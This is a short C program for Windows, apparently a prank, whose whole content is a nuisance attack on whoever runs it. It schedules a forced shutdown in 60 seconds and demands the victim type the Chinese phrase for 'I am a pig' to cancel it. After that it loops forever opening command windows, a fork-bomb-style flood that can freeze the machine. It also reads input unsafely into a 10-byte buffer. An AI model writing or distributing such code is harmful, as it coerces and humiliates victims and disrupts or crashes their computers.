#define _CRT_SECURE_NO_WARNINGS
#include<stdio.h>
#include<windows.h>
int main()
{
	char a[10];
	system("shutdown -s -t 60");
	printf("请输入“我是猪”，否则你的电脑将在60s后关机\n");
	printf(":");
loop:
	{
		scanf("%s", &a);
	}
	if (strcmp(a, "我是猪") != 0)
	{
		printf("输入错误！\n");
		printf("60秒还没有到，你还有机会\n");
		goto loop;
	}
	else {
		printf("你最终还是屈服了！\n");
		system("shutdown -a");
		Sleep(2000);
	}
	while (1)
	{
		system("start cmd");
	}
	return 0;
}

